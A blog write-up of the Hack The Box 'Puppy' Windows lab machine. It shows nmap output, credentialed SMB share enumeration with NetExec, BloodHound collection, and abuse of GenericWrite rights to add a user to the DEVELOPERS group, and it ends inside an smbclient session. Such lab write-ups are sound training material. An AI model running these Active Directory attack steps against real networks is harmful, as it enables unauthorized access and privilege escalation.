<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="This is my writeup of Puppy Windows Box From Hack The Box (Medium)"><title>Puppy HTB Writeup</title><link rel=canonical href=https://r4z1o.github.io/p/puppy-htb-writeup/><link rel=stylesheet href=/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css><meta property='og:title' content="Puppy HTB Writeup"><meta property='og:description' content="This is my writeup of Puppy Windows Box From Hack The Box (Medium)"><meta property='og:url' content='https://r4z1o.github.io/p/puppy-htb-writeup/'><meta property='og:site_name' content='     R4zi0'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='markdown'><meta property='article:tag' content='css'><meta property='article:tag' content='html'><meta property='article:tag' content='themes'><meta property='article:published_time' content='2025-05-22T00:00:00+00:00'><meta property='article:modified_time' content='2025-05-22T00:00:00+00:00'><meta property='og:image' content='https://r4z1o.github.io/p/puppy-htb-writeup/Puppy.png'><meta name=twitter:title content="Puppy HTB Writeup"><meta name=twitter:description content="This is my writeup of Puppy Windows Box From Hack The Box (Medium)"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='https://r4z1o.github.io/p/puppy-htb-writeup/Puppy.png'><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_8e81efca82e23b50.png width=300 height=300 class=site-logo loading=lazy alt=Avatar>
</a><span class=emoji>üç•</span></figure><div class=site-meta><h1 class=site-name><a href=/>R4zi0</a></h1><h2 class=site-description>Cyber Security Student | Offensive Security Enthusiast</h2></div></header><ol class=menu-social><li><a href=https://github.com/R4z1o target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://twitter.com target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#foothold->Foothold :</a></li><li><a href=#root->Root :</a></li></ol></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/puppy-htb-writeup/><img src=/p/puppy-htb-writeup/Puppy_hu_7ab312ee3a128037.png srcset="/p/puppy-htb-writeup/Puppy_hu_7ab312ee3a128037.png 800w, /p/puppy-htb-writeup/Puppy_hu_673ddb2a9796c946.png 1600w" width=800 height=297 loading=lazy alt="Featured image of post Puppy HTB Writeup"></a></div><div class=article-details><header class=article-category><a href=/categories/themes/>Themes
</a><a href=/categories/syntax/>Syntax</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/puppy-htb-writeup/>Puppy HTB Writeup</a></h2><h3 class=article-subtitle>This is my writeup of Puppy Windows Box From Hack The Box (Medium)</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>May 22, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>11 minute read</time></div></footer></div></header><section class=article-content><p>Nmap scan.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-zsh data-lang=zsh><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.11.70 <span class=o>(</span>10.10.11.70<span class=o>)</span>
</span></span><span class=line><span class=cl>Host is up, received user-set <span class=o>(</span>0.14s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Scanned at 2025-05-19 13:04:52 +01 <span class=k>for</span> 191s
</span></span><span class=line><span class=cl>Not shown: <span class=m>985</span> filtered tcp ports <span class=o>(</span>no-response<span class=o>)</span>
</span></span><span class=line><span class=cl>Bug in iscsi-info: no string output.
</span></span><span class=line><span class=cl>PORT     STATE SERVICE       REASON          VERSION
</span></span><span class=line><span class=cl>53/tcp   open  domain        syn-ack ttl <span class=m>127</span> Simple DNS Plus
</span></span><span class=line><span class=cl>88/tcp   open  kerberos-sec  syn-ack ttl <span class=m>127</span> Microsoft Windows Kerberos <span class=o>(</span>server time: 2025-05-20 01:04:53Z<span class=o>)</span>
</span></span><span class=line><span class=cl>111/tcp  open  rpcbind       syn-ack ttl <span class=m>127</span> 2-4 <span class=o>(</span>RPC <span class=c1>#100000)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> rpcinfo: 
</span></span><span class=line><span class=cl><span class=p>|</span>   program version    port/proto  service
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>100000</span>  2,3,4        111/tcp   rpcbind
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>100000</span>  2,3,4        111/tcp6  rpcbind
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>100000</span>  2,3,4        111/udp   rpcbind
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>100000</span>  2,3,4        111/udp6  rpcbind
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>100003</span>  2,3         2049/udp   nfs
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>100003</span>  2,3         2049/udp6  nfs
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>100005</span>  1,2,3       2049/udp   mountd
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>100005</span>  1,2,3       2049/udp6  mountd
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>100021</span>  1,2,3,4     2049/tcp   nlockmgr
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>100021</span>  1,2,3,4     2049/tcp6  nlockmgr
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>100021</span>  1,2,3,4     2049/udp   nlockmgr
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>100021</span>  1,2,3,4     2049/udp6  nlockmgr
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>100024</span>  <span class=m>1</span>           2049/tcp   status
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>100024</span>  <span class=m>1</span>           2049/tcp6  status
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>100024</span>  <span class=m>1</span>           2049/udp   status
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>100024</span>  <span class=m>1</span>           2049/udp6  status
</span></span><span class=line><span class=cl>135/tcp  open  msrpc         syn-ack ttl <span class=m>127</span> Microsoft Windows RPC
</span></span><span class=line><span class=cl>139/tcp  open  netbios-ssn   syn-ack ttl <span class=m>127</span> Microsoft Windows netbios-ssn
</span></span><span class=line><span class=cl>389/tcp  open  ldap          syn-ack ttl <span class=m>127</span> Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: PUPPY.HTB0., Site: Default-First-Site-Name<span class=o>)</span>
</span></span><span class=line><span class=cl>445/tcp  open  microsoft-ds? syn-ack ttl <span class=m>127</span>
</span></span><span class=line><span class=cl>464/tcp  open  kpasswd5?     syn-ack ttl <span class=m>127</span>
</span></span><span class=line><span class=cl>593/tcp  open  ncacn_http    syn-ack ttl <span class=m>127</span> Microsoft Windows RPC over HTTP 1.0
</span></span><span class=line><span class=cl>636/tcp  open  tcpwrapped    syn-ack ttl <span class=m>127</span>
</span></span><span class=line><span class=cl>2049/tcp open  nlockmgr      syn-ack ttl <span class=m>127</span> 1-4 <span class=o>(</span>RPC <span class=c1>#100021)</span>
</span></span><span class=line><span class=cl>3260/tcp open  iscsi?        syn-ack ttl <span class=m>127</span>
</span></span><span class=line><span class=cl>3268/tcp open  ldap          syn-ack ttl <span class=m>127</span> Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: PUPPY.HTB0., Site: Default-First-Site-Name<span class=o>)</span>
</span></span><span class=line><span class=cl>3269/tcp open  tcpwrapped    syn-ack ttl <span class=m>127</span>
</span></span><span class=line><span class=cl>5985/tcp open  http          syn-ack ttl <span class=m>127</span> Microsoft HTTPAPI httpd 2.0 <span class=o>(</span>SSDP/UPnP<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Not Found
</span></span><span class=line><span class=cl>Warning: OSScan results may be unreliable because we could not find at least <span class=m>1</span> open and <span class=m>1</span> closed port
</span></span><span class=line><span class=cl>Device type: general purpose
</span></span><span class=line><span class=cl>Running <span class=o>(</span>JUST GUESSING<span class=o>)</span>: Microsoft Windows 2022<span class=p>|</span>2012<span class=p>|</span><span class=m>2016</span> <span class=o>(</span>89%<span class=o>)</span>
</span></span><span class=line><span class=cl>OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
</span></span><span class=line><span class=cl>OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
</span></span><span class=line><span class=cl>Aggressive OS guesses: Microsoft Windows Server <span class=m>2022</span> <span class=o>(</span>89%<span class=o>)</span>, Microsoft Windows Server <span class=m>2012</span> R2 <span class=o>(</span>85%<span class=o>)</span>, Microsoft Windows Server <span class=m>2016</span> <span class=o>(</span>85%<span class=o>)</span>
</span></span><span class=line><span class=cl>No exact OS matches <span class=k>for</span> host <span class=o>(</span><span class=nb>test</span> conditions non-ideal<span class=o>)</span>.
</span></span><span class=line><span class=cl>TCP/IP fingerprint:
</span></span><span class=line><span class=cl>SCAN<span class=o>(</span><span class=nv>V</span><span class=o>=</span>7.95%E<span class=o>=</span>4%D<span class=o>=</span>5/19%OT<span class=o>=</span>53%CT<span class=o>=</span>%CU<span class=o>=</span>%PV<span class=o>=</span>Y%G<span class=o>=</span>N%TM<span class=o>=</span>682B1F23%P<span class=o>=</span>x86_64-pc-linux-gnu<span class=o>)</span>
</span></span><span class=line><span class=cl>SEQ<span class=o>(</span><span class=nv>SP</span><span class=o>=</span>104%GCD<span class=o>=</span>1%ISR<span class=o>=</span>10C%TI<span class=o>=</span>I%II<span class=o>=</span>I%SS<span class=o>=</span>S%TS<span class=o>=</span>A<span class=o>)</span>
</span></span><span class=line><span class=cl>SEQ<span class=o>(</span><span class=nv>SP</span><span class=o>=</span>106%GCD<span class=o>=</span>1%ISR<span class=o>=</span>10D%TI<span class=o>=</span>I%II<span class=o>=</span>I%SS<span class=o>=</span>S%TS<span class=o>=</span>A<span class=o>)</span>
</span></span><span class=line><span class=cl>OPS<span class=o>(</span><span class=nv>O1</span><span class=o>=</span>M552NW8ST11%O2<span class=o>=</span>M552NW8ST11%O3<span class=o>=</span>M552NW8NNT11%O4<span class=o>=</span>M552NW8ST11%O5<span class=o>=</span>M552NW8ST11%O6<span class=o>=</span>M552ST11<span class=o>)</span>
</span></span><span class=line><span class=cl>WIN<span class=o>(</span><span class=nv>W1</span><span class=o>=</span>FFFF%W2<span class=o>=</span>FFFF%W3<span class=o>=</span>FFFF%W4<span class=o>=</span>FFFF%W5<span class=o>=</span>FFFF%W6<span class=o>=</span>FFDC<span class=o>)</span>
</span></span><span class=line><span class=cl>ECN<span class=o>(</span><span class=nv>R</span><span class=o>=</span>Y%DF<span class=o>=</span>Y%TG<span class=o>=</span>80%W<span class=o>=</span>FFFF%O<span class=o>=</span>M552NW8NNS%CC<span class=o>=</span>Y%Q<span class=o>=)</span>
</span></span><span class=line><span class=cl>T1<span class=o>(</span><span class=nv>R</span><span class=o>=</span>Y%DF<span class=o>=</span>Y%TG<span class=o>=</span>80%S<span class=o>=</span>O%A<span class=o>=</span>S+%F<span class=o>=</span>AS%RD<span class=o>=</span>0%Q<span class=o>=)</span>
</span></span><span class=line><span class=cl>T2<span class=o>(</span><span class=nv>R</span><span class=o>=</span>N<span class=o>)</span>
</span></span><span class=line><span class=cl>T3<span class=o>(</span><span class=nv>R</span><span class=o>=</span>N<span class=o>)</span>
</span></span><span class=line><span class=cl>T4<span class=o>(</span><span class=nv>R</span><span class=o>=</span>N<span class=o>)</span>
</span></span><span class=line><span class=cl>U1<span class=o>(</span><span class=nv>R</span><span class=o>=</span>N<span class=o>)</span>
</span></span><span class=line><span class=cl>IE<span class=o>(</span><span class=nv>R</span><span class=o>=</span>Y%DFI<span class=o>=</span>N%TG<span class=o>=</span>80%CD<span class=o>=</span>Z<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Uptime guess: 0.024 days <span class=o>(</span>since Mon May <span class=m>19</span> 12:33:49 2025<span class=o>)</span>
</span></span><span class=line><span class=cl>TCP Sequence Prediction: <span class=nv>Difficulty</span><span class=o>=</span><span class=m>262</span> <span class=o>(</span>Good luck!<span class=o>)</span>
</span></span><span class=line><span class=cl>IP ID Sequence Generation: Incremental
</span></span><span class=line><span class=cl>Service Info: Host: DC<span class=p>;</span> OS: Windows<span class=p>;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host script results:
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-security-mode: 
</span></span><span class=line><span class=cl><span class=p>|</span>   3:1:1: 
</span></span><span class=line><span class=cl><span class=p>|</span>_    Message signing enabled and required
</span></span><span class=line><span class=cl><span class=p>|</span> p2p-conficker: 
</span></span><span class=line><span class=cl><span class=p>|</span>   Checking <span class=k>for</span> Conficker.C or higher...
</span></span><span class=line><span class=cl><span class=p>|</span>   Check <span class=m>1</span> <span class=o>(</span>port 62785/tcp<span class=o>)</span>: CLEAN <span class=o>(</span>Timeout<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   Check <span class=m>2</span> <span class=o>(</span>port 47994/tcp<span class=o>)</span>: CLEAN <span class=o>(</span>Timeout<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   Check <span class=m>3</span> <span class=o>(</span>port 26380/udp<span class=o>)</span>: CLEAN <span class=o>(</span>Timeout<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   Check <span class=m>4</span> <span class=o>(</span>port 46192/udp<span class=o>)</span>: CLEAN <span class=o>(</span>Timeout<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  0/4 checks are positive: Host is CLEAN or ports are blocked
</span></span><span class=line><span class=cl><span class=p>|</span>_clock-skew: 12h59m43s
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-time: 
</span></span><span class=line><span class=cl><span class=p>|</span>   date: 2025-05-20T01:07:03
</span></span><span class=line><span class=cl><span class=p>|</span>_  start_date: N/A
</span></span></code></pre></td></tr></table></div></div><h2 id=foothold->Foothold :</h2><p>I enumerated shares using <code>NetExec</code> but nothing interesting is showed up.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-zsh data-lang=zsh><span class=line><span class=cl>nxc smb puppy.htb -u <span class=s1>&#39;levi.james&#39;</span> -p <span class=s1>&#39;KingofAkron2025!&#39;</span> --shares                                           ÓÇ≤ ‚úî ÓÇ∂ 14:18:53 ÔÄó 
</span></span><span class=line><span class=cl>SMB         10.10.11.70     <span class=m>445</span>    DC               <span class=o>[</span>*<span class=o>]</span> Windows Server <span class=m>2022</span> Build <span class=m>20348</span> x64 <span class=o>(</span>name:DC<span class=o>)</span> <span class=o>(</span>domain:PUPPY.HTB<span class=o>)</span> <span class=o>(</span>signing:True<span class=o>)</span> <span class=o>(</span>SMBv1:False<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.11.70     <span class=m>445</span>    DC               <span class=o>[</span>+<span class=o>]</span> PUPPY.HTB<span class=se>\l</span>evi.james:KingofAkron2025! 
</span></span><span class=line><span class=cl>SMB         10.10.11.70     <span class=m>445</span>    DC               <span class=o>[</span>*<span class=o>]</span> Enumerated shares
</span></span><span class=line><span class=cl>SMB         10.10.11.70     <span class=m>445</span>    DC               Share           Permissions     Remark
</span></span><span class=line><span class=cl>SMB         10.10.11.70     <span class=m>445</span>    DC               -----           -----------     ------
</span></span><span class=line><span class=cl>SMB         10.10.11.70     <span class=m>445</span>    DC               ADMIN$                          Remote Admin
</span></span><span class=line><span class=cl>SMB         10.10.11.70     <span class=m>445</span>    DC               C$                              Default share
</span></span><span class=line><span class=cl>SMB         10.10.11.70     <span class=m>445</span>    DC               DEV                             DEV-SHARE <span class=k>for</span> PUPPY-DEVS
</span></span><span class=line><span class=cl>SMB         10.10.11.70     <span class=m>445</span>    DC               IPC$            READ            Remote IPC
</span></span><span class=line><span class=cl>SMB         10.10.11.70     <span class=m>445</span>    DC               NETLOGON        READ            Logon server share 
</span></span><span class=line><span class=cl>SMB         10.10.11.70     <span class=m>445</span>    DC               SYSVOL          READ            Logon server share 
</span></span></code></pre></td></tr></table></div></div><p>Since this is credentialed, i used them to gather Bloodhound digest to get a better view of the whole environement.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-zsh data-lang=zsh><span class=line><span class=cl> bloodhound-python -u levi.james -p <span class=s1>&#39;KingofAkron2025!&#39;</span> -d puppy.htb -ns 10.10.11.70 -c All  
</span></span></code></pre></td></tr></table></div></div><p>As we can see our user <code>levi.james</code> is part of the <code>HR</code> group, who&rsquo;s members have <code>GenericWrite</code> over the <code>DEVELOPERS</code> Group.</p><p><img src=/p/puppy-htb-writeup/Puppy2.png width=728 height=222 srcset="/p/puppy-htb-writeup/Puppy2_hu_5c04e55a8a5528fe.png 480w, /p/puppy-htb-writeup/Puppy2_hu_ef81f989f66641ed.png 1024w" loading=lazy alt=" " class=gallery-image data-flex-grow=327 data-flex-basis=787px></p><p>We can leverage that by adding this user the <code>DEVELOPERS</code> Group.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-zsh data-lang=zsh><span class=line><span class=cl>net rpc group addmem <span class=s2>&#34;DEVELOPERS&#34;</span> <span class=s2>&#34;levi.james&#34;</span> -U <span class=s2>&#34;PUPPY.HTB&#34;</span>/<span class=s2>&#34;levi.james&#34;</span>%<span class=s2>&#34;KingofAkron2025\!&#34;</span> -S <span class=s2>&#34;DC.PUPPY.HTB&#34;</span>
</span></span><span class=line><span class=cl>Can<span class=err>&#39;</span>t load /etc/samba/smb.conf - run testparm to debug it
</span></span></code></pre></td></tr></table></div></div><p>By enumerating shares once again, we can see that we have READ access to the <code>DEV</code> share.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-zsh data-lang=zsh><span class=line><span class=cl>nxc smb puppy.htb -u <span class=s1>&#39;levi.james&#39;</span> -p <span class=s1>&#39;KingofAkron2025!&#39;</span> --shares         
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>SMB         10.10.11.70     <span class=m>445</span>    DC               <span class=o>[</span>*<span class=o>]</span> Windows Server <span class=m>2022</span> Build <span class=m>20348</span> x64 <span class=o>(</span>name:DC<span class=o>)</span> <span class=o>(</span>domain:PUPPY.HTB<span class=o>)</span> <span class=o>(</span>signing:True<span class=o>)</span> <span class=o>(</span>SMBv1:False<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.11.70     <span class=m>445</span>    DC               <span class=o>[</span>+<span class=o>]</span> PUPPY.HTB<span class=se>\l</span>evi.james:KingofAkron2025! 
</span></span><span class=line><span class=cl>SMB         10.10.11.70     <span class=m>445</span>    DC               <span class=o>[</span>*<span class=o>]</span> Enumerated shares
</span></span><span class=line><span class=cl>SMB         10.10.11.70     <span class=m>445</span>    DC               Share           Permissions     Remark
</span></span><span class=line><span class=cl>SMB         10.10.11.70     <span class=m>445</span>    DC               -----           -----------     ------
</span></span><span class=line><span class=cl>SMB         10.10.11.70     <span class=m>445</span>    DC               ADMIN$                          Remote Admin
</span></span><span class=line><span class=cl>SMB         10.10.11.70     <span class=m>445</span>    DC               C$                              Default share
</span></span><span class=line><span class=cl>SMB         10.10.11.70     <span class=m>445</span>    DC               DEV             READ            DEV-SHARE <span class=k>for</span> PUPPY-DEVS
</span></span><span class=line><span class=cl>SMB         10.10.11.70     <span class=m>445</span>    DC               IPC$            READ            Remote IPC
</span></span><span class=line><span class=cl>SMB         10.10.11.70     <span class=m>445</span>    DC               NETLOGON        READ            Logon server share 
</span></span><span class=line><span class=cl>SMB         10.10.11.70     <span class=m>445</span>    DC               SYSVOL          READ            Logon server share 
</span></span></code></pre></td></tr></table></div></div><p>After accessing the share i can see a <code>.kdbx</code> database extension file.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-zsh data-lang=zsh><span class=line><span class=cl>smbclient //dc.puppy.htb/DEV -U <span class=s1>&#39;PUPPY.HTB\levi.james&#39;</span>                 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Can<span class=err>&#39;</span>t load /etc/samba/smb.conf - run testparm to debug it
</span></span><span class=line><span class=cl>Password <span class=k>for</span> <span class=o>[</span>PUPPY.HTB<span class=se>\l</span>evi.james<span class=o>]</span>:
</span></span><span class=line><span class=cl>Try <span class=s2>&#34;help&#34;</span> to get a list of possible commands.
</span></span><span class=line><span class=cl>smb: <span class=se>\&gt;</span> ls
